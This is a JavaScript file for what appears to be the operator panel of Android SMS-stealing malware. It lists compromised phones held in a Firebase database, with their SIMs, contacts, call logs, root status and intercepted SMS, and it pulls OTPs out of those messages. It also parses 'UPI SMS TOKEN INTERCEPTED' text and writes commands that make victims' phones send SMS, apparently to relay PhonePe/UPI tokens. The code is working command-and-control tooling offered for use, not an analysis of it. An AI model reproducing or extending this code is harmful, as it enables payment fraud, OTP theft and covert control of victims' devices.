let DATA = { devices: [], stats: {}, generatedAt: "" };
let CURRENT = null;
let MSG_CACHE = new Map();
let activeTab = "overview";
let senderBusy = false;

const RTDB = "https://axexodiweb-default-rtdb.firebaseio.com";

const $ = (id) => document.getElementById(id);

function esc(s) {
  return String(s ?? "").replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[c]));
}

function fmtNum(n) {
  return Number(n || 0).toLocaleString();
}

function batteryPct(b) {
  const n = parseInt(String(b ?? "").replace(/[^\d]/g, ""), 10);
  return Number.isNaN(n) ? null : Math.max(0, Math.min(100, n));
}

function batteryClass(b) {
  const n = batteryPct(b);
  if (n == null) return "";
  if (n <= 20) return "bad";
  if (n <= 40) return "warn";
  return "ok";
}

function highlight(text, q) {
  const safe = esc(text);
  if (!q) return safe;
  const needle = esc(q).replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  return safe.replace(new RegExp(`(${needle})`, "ig"), "<mark>$1</mark>");
}

function ownerLabel(o) {
  return o ? `<span class="mono">@${esc(o)}</span>` : '<span class="muted">—</span>';
}

function kv(label, value, cls = "") {
  const v = value === 0 || value === "0" || value ? esc(value) : '<span class="muted">—</span>';
  return `<div class="kv ${cls}"><dt>${esc(label)}</dt><dd>${v}</dd></div>`;
}

function log(el, html, cls = "") {
  const box = typeof el === "string" ? $(el) : el;
  if (!box) return;
  const line = document.createElement("div");
  line.className = `log-line ${cls}`;
  line.innerHTML = html;
  box.prepend(line);
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function normalizePhone(n) {
  let x = String(n || "").replace(/[^\d+]/g, "");
  if (!x) return "";
  if (x.startsWith("00")) x = "+" + x.slice(2);
  if (/^0\d{10}$/.test(x)) x = "+91" + x.slice(1);
  if (/^\d{10}$/.test(x)) x = "+91" + x;
  if (/^\d{12}$/.test(x)) x = "+91" + x.slice(2);
  if (x && !x.startsWith("+")) x = "+" + x;
  return x;
}

/** Parse PhonePe / intercepted token blocks into {to, body} */
function parseIntercepted(text) {
  const clean = String(text || "").replace(/`/g, "");
  let body = "";
  let to = "";

  const bodyMatch = clean.match(/RECIPIENT\s*:\s*([\s\S]*?)\s*🏷️\s*MESSAGE/i);
  const numMatch = clean.match(/MESSAGE\s*:\s*(\+?\d{10,15})/i);
  if (bodyMatch) body = bodyMatch[1].trim();
  if (numMatch) to = normalizePhone(numMatch[1]);

  // Alternate: MESSAGE block then phone on same/next line
  if (!body) {
    const m2 = clean.match(/MESSAGE\s*:\s*([\s\S]+?)(?:\n\s*(?:🏷️|RECIPIENT|$)|$)/i);
    if (m2) body = m2[1].trim();
  }

  // UPI SMS TOKEN INTERCEPTED common layout
  if (!body || !to) {
    const to2 = clean.match(/(?:TO|NUMBER|RECIPIENT)\s*[:#]?\s*(\+?\d{10,15})/i);
    if (to2 && !to) to = normalizePhone(to2[1]);
    const body2 = clean.match(/(?:BODY|SMS|CONTENT|MESSAGE)\s*[:#]\s*([\s\S]{8,})/i);
    if (body2 && !body) body = body2[1].trim().split(/\n\s*\n/)[0].trim();
  }

  // Fallback: first phone + rest after marker
  if (!to) {
    const p = clean.match(/(\+?91\d{10}|\d{10})/);
    if (p) to = normalizePhone(p[1]);
  }
  if (!body && clean.includes("UPI SMS TOKEN INTERCEPTED")) {
    body = clean.split("UPI SMS TOKEN INTERCEPTED").slice(1).join("UPI SMS TOKEN INTERCEPTED").trim();
    body = body.replace(/^[\s\S]*?MESSAGE\s*:\s*/i, "").trim();
    if (!body) body = clean.slice(0, 500);
  }
  if (!body) body = clean.trim().slice(0, 900);

  return { to, body: body.slice(0, 900) };
}

async function rtdbPut(path, value) {
  const url = `${RTDB}/${path.replace(/^\//, "")}.json`;
  const res = await fetch(url, {
    method: "PUT",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(value),
  });
  if (!res.ok) {
    let detail = "";
    try { detail = await res.text(); } catch (_) {}
    throw new Error(`RTDB ${res.status} ${detail.slice(0, 180)}`);
  }
  return res.json();
}

async function rtdbGet(path) {
  const url = `${RTDB}/${path.replace(/^\//, "")}.json`;
  const res = await fetch(url);
  if (!res.ok) throw new Error(`RTDB GET ${res.status}`);
  return res.json();
}

async function sendViaDevice({ did, sim, to, body, priority = "high", logEl }) {
  if (!did) throw new Error("No device DID");
  const number = normalizePhone(to);
  if (!number || number.length < 12) throw new Error("Recipient number invalid");
  if (!body || body.trim().length < 2) throw new Error("Message body empty");

  const slot = Number(sim) || 0;
  const path = `clients/${did}/webhookEvent/sendSms`;
  const payload = {
    from: slot,
    simSlot: slot,
    slot,
    sim_slot: slot,
    to: number,
    message: body.trim(),
    isSended: false,
    priority,
    timestamp: Date.now(),
  };

  log(logEl, `→ PUT <span class="mono">${path}</span>`, "info");
  await rtdbPut(path, payload);
  log(logEl, `✓ Queued to <span class="mono">${esc(number)}</span> · SIM ${slot}`, "ok");
  return monitorSend(did, logEl);
}

async function monitorSend(did, logEl) {
  const path = `clients/${did}/webhookEvent/sendSms/isSended`;
  for (let i = 0; i < 45; i++) {
    try {
      const v = await rtdbGet(path);
      if (v === true) {
        log(logEl, "✅ Device confirmed SMS sent", "ok");
        return { ok: true };
      }
    } catch (_) { /* retry */ }
    if (i === 0 || (i + 1) % 5 === 0) {
      log(logEl, `… waiting isSended (${i + 1}s)`, "muted");
    }
    await sleep(1000);
  }
  log(logEl, "⚠️ Timeout — no confirmation in 45s", "warn");
  return { ok: false, timeout: true };
}

function fillSenderDevices(selectedId) {
  const sel = $("sDevice");
  const online = DATA.devices.filter((d) => d.online);
  const rest = DATA.devices.filter((d) => !d.online);
  const opt = (d) =>
    `<option value="${esc(d.clientId)}">${esc(d.tag)} · ${esc(d.deviceName)}${d.online ? " ●" : ""}</option>`;
  sel.innerHTML =
    `<optgroup label="Online (${online.length})">${online.map(opt).join("")}</optgroup>` +
    `<optgroup label="All devices">${rest.map(opt).join("")}</optgroup>`;
  if (selectedId) sel.value = selectedId;
}

function openSender(did) {
  fillSenderDevices(did || $("sDevice").value);
  $("backdrop").hidden = false;
  $("sender").hidden = false;
  $("sender").setAttribute("aria-hidden", "false");
  document.body.classList.add("drawer-open");
  $("sClose").focus();
}

function closeSender() {
  $("sender").hidden = true;
  $("sender").setAttribute("aria-hidden", "true");
  if ($("drawer").hidden) {
    $("backdrop").hidden = true;
    document.body.classList.remove("drawer-open");
  }
}

async function handleGlobalSend() {
  if (senderBusy) return;
  senderBusy = true;
  $("sSendBtn").disabled = true;
  try {
    await sendViaDevice({
      did: $("sDevice").value,
      sim: $("sSim").value,
      to: $("sTo").value,
      body: $("sBody").value,
      priority: $("sPriority").value,
      logEl: "sStatus",
    });
  } catch (e) {
    log("sStatus", `✗ ${esc(e.message)}`, "err");
  } finally {
    senderBusy = false;
    $("sSendBtn").disabled = false;
  }
}

async function handleDeviceSend() {
  if (!CURRENT || senderBusy) return;
  senderBusy = true;
  $("dSendBtn").disabled = true;
  try {
    await sendViaDevice({
      did: CURRENT.clientId,
      sim: $("dSim").value,
      to: $("dTo").value,
      body: $("dBody").value,
      logEl: "dStatus",
    });
  } catch (e) {
    log("dStatus", `✗ ${esc(e.message)}`, "err");
  } finally {
    senderBusy = false;
    $("dSendBtn").disabled = false;
  }
}

async function quickOtpFromDevice() {
  if (!CURRENT) return;
  const data = await loadMessages(CURRENT.clientId);
  const otpMsg = (data.messages || []).find((m) => m.otp);
  if (!otpMsg) {
    log("dStatus", "No OTP message found in stored SMS", "warn");
    return;
  }
  $("dBody").value = otpMsg.text;
  log("dStatus", `Loaded OTP from ${esc(otpMsg.sender || "sms")} · ${esc(otpMsg.dateTime || "")}`, "ok");
}

function renderStats(s) {
  const cards = [
    { label: "Devices", value: s.total, hint: "RTDB /clients" },
    { label: "Online", value: s.online, hint: `${s.offline} offline`, cls: "ok" },
    { label: "Messages", value: fmtNum(s.messagesTotal), hint: `${fmtNum(s.devicesWithMessages)} devices` },
    { label: "OTP hits", value: fmtNum(s.otpMessages) },
    { label: "With SIM", value: s.withSims },
    { label: "Owned", value: s.owned },
    { label: "Samples cut", value: s.sampleRemoved ?? 0, hint: "placeholders removed" },
    { label: "Rooted", value: s.rooted, cls: s.rooted ? "bad" : "" },
  ];
  $("stats").innerHTML = cards.map((c) => `
    <div class="card ${c.cls || ""}">
      <div class="label">${esc(c.label)}</div>
      <div class="value">${esc(c.value ?? 0)}</div>
      ${c.hint ? `<div class="hint">${esc(c.hint)}</div>` : ""}
    </div>`).join("");
}

function fillAndroidFilter(devices) {
  const versions = [...new Set(devices.map((d) => d.android || "?"))]
    .sort((a, b) => String(a).localeCompare(String(b), undefined, { numeric: true }));
  $("fAndroid").innerHTML = '<option value="">Android</option>' +
    versions.map((v) => `<option value="${esc(v)}">${esc(v)}</option>`).join("");
}

function filtered() {
  const q = $("search").value.trim().toLowerCase();
  const st = $("fStatus").value;
  const av = $("fAndroid").value;
  const ownedOnly = $("fOwned").checked;
  const msgsOnly = $("fMsgs").checked;
  const simsOnly = $("fSims").checked;
  const sort = $("fSort").value;

  let rows = DATA.devices.filter((d) => {
    if (st === "online" && !d.online) return false;
    if (st === "offline" && d.online) return false;
    if (av && (d.android || "?") !== av) return false;
    if (ownedOnly && !d.owner) return false;
    if (msgsOnly && !d.hasMessages) return false;
    if (simsOnly && !(d.simCount > 0)) return false;
    if (!q) return true;
    const hay = [
      d.tag, d.num, d.deviceName, d.model, d.clientId, d.owner,
      d.ip, d.mobNo, d.provider, d.android, d.label, d.source,
      d.lastMessage?.preview, d.lastMessage?.sender,
      ...(d.sims || []).map((s) => `${s.carrier} ${s.number}`),
    ].join(" ").toLowerCase();
    return hay.includes(q);
  });

  const by = {
    messages: (a, b) => (b.messageCount || 0) - (a.messageCount || 0) || a.num - b.num,
    name: (a, b) => a.deviceName.localeCompare(b.deviceName) || a.num - b.num,
    online: (a, b) => Number(b.online) - Number(a.online) || a.num - b.num,
    battery: (a, b) => (batteryPct(b.battery) ?? -1) - (batteryPct(a.battery) ?? -1) || a.num - b.num,
    num: (a, b) => a.num - b.num,
  };
  if (by[sort]) rows = rows.slice().sort(by[sort]);
  return rows;
}

function renderTable() {
  const rows = filtered();
  const tbody = $("tbody");
  $("empty").hidden = rows.length > 0;
  $("count").textContent = `${rows.length} / ${DATA.devices.length} devices`;

  tbody.innerHTML = rows.map((d) => {
    const lm = d.lastMessage;
    const preview = lm?.preview
      ? `<div class="msg-preview">${esc(lm.preview)}</div>
         <div class="msg-meta muted">${esc(lm.sender || "")} · ${esc(lm.dateTime || "")}</div>`
      : '<span class="muted">—</span>';
    const pct = batteryPct(d.battery);
    return `
    <tr data-id="${esc(d.clientId)}" class="row-click" tabindex="0" title="Open device details">
      <td><span class="tag">${esc(d.tag)}</span></td>
      <td>
        <div class="dev-name">${esc(d.deviceName)}</div>
        <div class="dev-model">${esc(d.model || "—")}${d.arch ? " · " + esc(d.arch) : ""}</div>
      </td>
      <td>
        <span class="pill ${d.online ? "on" : "off"}">${d.online ? "● Online" : "○ Offline"}</span>
        ${d.root ? '<span class="pill root">Root</span>' : ""}
        ${d.like ? '<span class="pill star">★</span>' : ""}
      </td>
      <td>${esc(d.android || "?")}${d.sdk ? `<div class="muted">SDK ${esc(d.sdk)}</div>` : ""}</td>
      <td>
        <span class="${batteryClass(d.battery)}">${esc(d.battery || "—")}</span>
        ${pct != null ? `<div class="bat-bar"><i style="width:${pct}%"></i></div>` : ""}
      </td>
      <td>${d.simCount ? `<span class="pill sims">${d.simCount}</span>` : '<span class="muted">—</span>'}</td>
      <td>${d.messageCount ? `<span class="pill msgs">${fmtNum(d.messageCount)}</span>` : '<span class="muted">0</span>'}</td>
      <td class="last-msg">${preview}</td>
      <td>${ownerLabel(d.owner)}</td>
      <td class="actions">
        <button type="button" class="btn small ghost send-row" data-send="${esc(d.clientId)}" title="Token send">⚡</button>
        <button type="button" class="btn small open-btn">Open</button>
      </td>
    </tr>`;
  }).join("");

  tbody.querySelectorAll("tr.row-click").forEach((tr) => {
    const open = () => openDrawer(tr.dataset.id);
    tr.addEventListener("click", (e) => {
      if (e.target.closest(".send-row")) return;
      open();
    });
    tr.addEventListener("keydown", (e) => {
      if (e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        open();
      }
    });
  });
  tbody.querySelectorAll(".send-row").forEach((btn) => {
    btn.addEventListener("click", (e) => {
      e.stopPropagation();
      openSender(btn.dataset.send);
    });
  });
}

function exportCsv() {
  const rows = filtered();
  const cols = [
    "num","tag","deviceName","model","android","sdk","arch","battery","storage",
    "ip","online","root","simCount","mobNo","provider","owner","clientId",
    "joined","messageCount","callLogCount","contactCount",
  ];
  const lines = [cols.join(",")];
  for (const d of rows) {
    lines.push(cols.map((c) => {
      let v = d[c];
      if (v === true) v = "1";
      if (v === false) v = "0";
      if (v == null) v = "";
      return `"${String(v).replace(/"/g, '""').replace(/\r?\n/g, " ")}"`;
    }).join(","));
  }
  const blob = new Blob([lines.join("\n")], { type: "text/csv;charset=utf-8" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = `devices-${new Date().toISOString().slice(0, 10)}.csv`;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(a.href), 1000);
}

async function loadMessages(clientId) {
  if (MSG_CACHE.has(clientId)) return MSG_CACHE.get(clientId);
  const res = await fetch(`data/messages/${encodeURIComponent(clientId)}.json`);
  if (!res.ok) {
    const empty = { clientId, total: 0, stored: 0, truncated: false, messages: [] };
    MSG_CACHE.set(clientId, empty);
    return empty;
  }
  const data = await res.json();
  MSG_CACHE.set(clientId, data);
  return data;
}

function renderOverview(d) {
  const pct = batteryPct(d.battery);
  $("tab-overview").innerHTML = `
    <div class="hero-grid">
      <div class="stat-tile">
        <span>Battery</span>
        <strong class="${batteryClass(d.battery)}">${esc(d.battery || "—")}</strong>
        ${pct != null ? `<div class="bat-bar lg"><i style="width:${pct}%"></i></div>` : ""}
      </div>
      <div class="stat-tile">
        <span>SMS</span>
        <strong>${fmtNum(d.messageCount)}</strong>
        ${d.messageTruncated ? '<small>newest stored only</small>' : ""}
      </div>
      <div class="stat-tile">
        <span>SIMs</span>
        <strong>${d.simCount || 0}</strong>
      </div>
      <div class="stat-tile">
        <span>Calls</span>
        <strong>${fmtNum(d.callLogCount)}</strong>
      </div>
    </div>
    <dl class="kv-grid">
      ${kv("Client ID", d.clientId, "mono")}
      ${kv("Model", d.model)}
      ${kv("Android", d.android ? `${d.android}${d.sdk ? ` · SDK ${d.sdk}` : ""}` : "")}
      ${kv("CPU arch", d.arch)}
      ${kv("Storage", d.storage)}
      ${kv("IP address", d.ip, "mono")}
      ${kv("Carrier", d.provider)}
      ${kv("Mobile", d.mobNo, "mono")}
      ${kv("Owner", d.owner ? `@${d.owner}` : "")}
      ${kv("Joined", d.joined)}
      ${kv("Rooted", d.root ? "Yes" : "No")}
      ${kv("SD card", d.sdcard ? "Yes" : "No")}
      ${kv("Last SMS", d.lastMessage?.dateTime || "")}
    </dl>
    <div class="field-row" style="margin-top:14px">
      <button type="button" class="btn accent" id="ovSend">⚡ Send token via this device</button>
    </div>`;
  const b = $("ovSend");
  if (b) b.addEventListener("click", () => showTab("send"));
}

function renderSims(d) {
  const sims = d.sims || [];
  if (!sims.length) {
    $("tab-sims").innerHTML = '<p class="empty">No SIM data for this device.</p>';
    return;
  }
  $("tab-sims").innerHTML = `
    <div class="sim-list">
      ${sims.map((s) => `
        <article class="sim-card">
          <header>
            <span class="slot">Slot ${esc(String(s.slot ?? "?"))}</span>
            <strong>${esc(s.carrier || "Unknown carrier")}</strong>
          </header>
          <div class="sim-num mono">${esc(s.number || "Unknown")}</div>
        </article>`).join("")}
    </div>
    <dl class="kv-grid">
      ${kv("Service provider", d.provider)}
      ${kv("Mobile number", d.mobNo, "mono")}
      ${kv("SIM count", d.simCount)}
    </dl>`;
}

function renderInfo(d) {
  const extras = Object.entries(d.extras || {});
  const fields = (d.fields || []).filter((f) => !["call_logs","contacts","sims","webhookEvent"].includes(f));
  $("tab-info").innerHTML = `
    <dl class="kv-grid">
      ${kv("Label", d.label)}
      ${kv("Source", d.source)}
      ${kv("Last seen", d.lastSeen)}
      ${kv("Login time", d.loginTime)}
      ${kv("SMS command", d.smsCommand, "mono")}
      ${kv("Commands", (d.commands || []).join(", "), "mono")}
      ${kv("Contacts", fmtNum(d.contactCount))}
      ${kv("Permissions", d.permissionCount)}
      ${kv("Has webhook", d.hasWebhook ? "Yes" : "No")}
      ${kv("Secret fields present", (d.secretFields || []).join(", ") || "")}
      ${kv("Message files", d.hasMessages ? `${fmtNum(d.messageCount)} total · ${fmtNum(d.messageStored)} stored` : "none")}
    </dl>
    ${d.permissions?.length ? `
      <h3 class="sec">Permissions</h3>
      <div class="chips">${d.permissions.map((p) => `<span class="chip">${esc(typeof p === "string" ? p : JSON.stringify(p))}</span>`).join("")}</div>` : ""}
    ${extras.length ? `
      <h3 class="sec">Extra</h3>
      <dl class="kv-grid">${extras.map(([k, v]) => kv(k, typeof v === "object" ? JSON.stringify(v) : v)).join("")}</dl>` : ""}
    <h3 class="sec">RTDB fields</h3>
    <div class="chips">${fields.map((f) => `<span class="chip">${esc(f)}</span>`).join("") || '<span class="muted">—</span>'}</div>
    <p class="hint">Sensitive payment secrets are never exported to this panel — only presence flags are shown.</p>`;
}

function renderMessages(data) {
  const q = $("msgSearch").value.trim().toLowerCase();
  const type = $("msgType").value;
  let list = data.messages || [];

  if (type === "incoming" || type === "outgoing") {
    list = list.filter((m) => m.type === type);
  } else if (type === "otp") {
    list = list.filter((m) => m.otp);
  }
  if (q) {
    list = list.filter((m) =>
      [m.text, m.sender, m.otp, m.dateTime].join(" ").toLowerCase().includes(q)
    );
  }

  $("msgCount").textContent = `${fmtNum(list.length)} · ${fmtNum(data.total)} total`;
  const el = $("msgList");
  if (!list.length) {
    el.innerHTML = '<p class="empty">No messages match.</p>';
    return;
  }

  const CHUNK = 80;
  const slice = list.slice(0, CHUNK);
  el.innerHTML = slice.map((m) => {
    const dir = m.type === "outgoing" ? "out" : "in";
    return `
      <article class="msg ${dir}${m.sensitive ? " sens" : ""}">
        <header class="msg-hd">
          <span class="dir">${dir === "in" ? "↓" : "↑"} ${esc(m.type)}</span>
          <span class="sender">${esc(m.sender || "?")}</span>
          <time>${esc(m.dateTime || m.ts || "")}</time>
          ${m.otp ? `<span class="otp">OTP ${esc(m.otp)}</span>` : ""}
        </header>
        <div class="msg-body">${highlight(m.text, q)}</div>
      </article>`;
  }).join("") + (list.length > CHUNK
    ? `<button type="button" class="btn ghost load-more" id="loadMore">Load ${fmtNum(list.length - CHUNK)} more</button>`
    : "");

  const more = $("loadMore");
  if (more) {
    more.addEventListener("click", () => {
      const rest = list.slice(CHUNK);
      more.insertAdjacentHTML("beforebegin", rest.map((m) => {
        const dir = m.type === "outgoing" ? "out" : "in";
        return `
        <article class="msg ${dir}${m.sensitive ? " sens" : ""}">
          <header class="msg-hd">
            <span class="dir">${dir === "in" ? "↓" : "↑"} ${esc(m.type)}</span>
            <span class="sender">${esc(m.sender || "?")}</span>
            <time>${esc(m.dateTime || m.ts || "")}</time>
            ${m.otp ? `<span class="otp">OTP ${esc(m.otp)}</span>` : ""}
          </header>
          <div class="msg-body">${highlight(m.text, q)}</div>
        </article>`;
      }).join(""));
      more.remove();
    });
  }
}

function renderSendTab(d) {
  $("dSendPath").textContent = `clients/${d.clientId}/webhookEvent/sendSms`;
  $("dStatus").innerHTML = "";
  if (d.mobNo && !$("dTo").value) $("dTo").placeholder = d.mobNo || "+91XXXXXXXXXX";
  // preselect sim 0
  $("dSim").value = d.sims?.[0]?.slot != null ? String(d.sims[0].slot) : "0";
}

async function showTab(name) {
  activeTab = name;
  document.querySelectorAll("#drawer .tab").forEach((t) => {
    t.classList.toggle("active", t.dataset.tab === name);
  });
  document.querySelectorAll("#drawer .tab-panel").forEach((p) => {
    const on = p.id === `tab-${name}`;
    p.classList.toggle("active", on);
    p.hidden = !on;
  });
  if (!CURRENT) return;
  if (name === "overview") renderOverview(CURRENT);
  if (name === "sims") renderSims(CURRENT);
  if (name === "info") renderInfo(CURRENT);
  if (name === "send") renderSendTab(CURRENT);
  if (name === "messages") {
    const data = await loadMessages(CURRENT.clientId);
    if (CURRENT && activeTab === "messages") renderMessages(data);
  }
}

async function openDrawer(clientId) {
  const d = DATA.devices.find((x) => x.clientId === clientId);
  if (!d) return;
  CURRENT = d;

  $("dTag").textContent = d.tag;
  $("dTitle").textContent = d.deviceName;
  $("dSub").textContent = [d.model, d.android && `Android ${d.android}`, d.clientId].filter(Boolean).join(" · ");
  $("dBadges").innerHTML = [
    `<span class="pill ${d.online ? "on" : "off"}">${d.online ? "● Online" : "○ Offline"}</span>`,
    d.root ? '<span class="pill root">Root</span>' : "",
    d.hasMessages ? `<span class="pill msgs">${fmtNum(d.messageCount)} SMS</span>` : "",
    d.owner ? `<span class="pill owner">@${esc(d.owner)}</span>` : "",
  ].join("");

  $("msgSearch").value = "";
  $("msgType").value = "";
  $("msgCount").textContent = "";
  $("msgList").innerHTML = '<p class="empty">Loading messages…</p>';
  $("dTo").value = "";
  $("dBody").value = "";
  $("dStatus").innerHTML = "";
  $("backdrop").hidden = false;
  $("drawer").hidden = false;
  $("drawer").setAttribute("aria-hidden", "false");
  document.body.classList.add("drawer-open");
  $("dClose").focus();

  await showTab("overview");
}

function closeDrawer() {
  CURRENT = null;
  $("drawer").hidden = true;
  $("drawer").setAttribute("aria-hidden", "true");
  if ($("sender").hidden) {
    $("backdrop").hidden = true;
    document.body.classList.remove("drawer-open");
  }
}

function bindUI() {
  $("dClose").addEventListener("click", closeDrawer);
  $("sClose").addEventListener("click", closeSender);
  $("backdrop").addEventListener("click", () => {
    closeDrawer();
    closeSender();
  });
  document.addEventListener("keydown", (e) => {
    if (e.key !== "Escape") return;
    if (!$("sender").hidden) closeSender();
    else if (!$("drawer").hidden) closeDrawer();
  });
  document.querySelectorAll("#drawer .tab").forEach((t) => {
    t.addEventListener("click", () => showTab(t.dataset.tab));
  });
  $("msgSearch").addEventListener("input", async () => {
    if (!CURRENT || activeTab !== "messages") return;
    renderMessages(await loadMessages(CURRENT.clientId));
  });
  $("msgType").addEventListener("change", async () => {
    if (!CURRENT || activeTab !== "messages") return;
    renderMessages(await loadMessages(CURRENT.clientId));
  });
  ["search", "fStatus", "fAndroid", "fOwned", "fMsgs", "fSims", "fSort"].forEach((id) => {
    const el = $(id);
    if (!el) return;
    el.addEventListener("input", renderTable);
    el.addEventListener("change", renderTable);
  });
  $("exportBtn").addEventListener("click", exportCsv);
  $("refreshBtn").addEventListener("click", () => location.reload());
  $("openSenderBtn").addEventListener("click", () => openSender());
  $("sSendBtn").addEventListener("click", handleGlobalSend);
  $("dSendBtn").addEventListener("click", handleDeviceSend);
  $("dQuickOtp").addEventListener("click", quickOtpFromDevice);
  $("sParseBtn").addEventListener("click", () => {
    const parsed = parseIntercepted($("sBody").value);
    if (parsed.to) $("sTo").value = parsed.to;
    if (parsed.body) $("sBody").value = parsed.body;
    log("sStatus", parsed.to
      ? `Parsed to=<span class="mono">${esc(parsed.to)}</span> · body ${parsed.body.length} chars`
      : "Parsed body only — set recipient manually",
      parsed.to ? "ok" : "warn");
  });
}

async function init() {
  const res = await fetch(`data/devices.json?t=${Date.now()}`, { cache: "no-store" });
  if (!res.ok) throw new Error("Failed to load data/devices.json");
  DATA = await res.json();

  renderStats(DATA.stats || {});
  fillAndroidFilter(DATA.devices || []);
  fillSenderDevices();
  $("meta").innerHTML = `<strong>${esc(DATA.project || "axexodiweb")}</strong> · ${DATA.devices.length} clients · ${fmtNum(DATA.stats?.messagesTotal)} msgs`;
  $("generated").textContent = DATA.generatedAt ? `Updated ${DATA.generatedAt}` : "";

  bindUI();
  renderTable();
}

init().catch((e) => {
  $("meta").textContent = e.message;
  $("tbody").innerHTML = "";
  $("empty").hidden = false;
  $("empty").textContent = e.message;
});
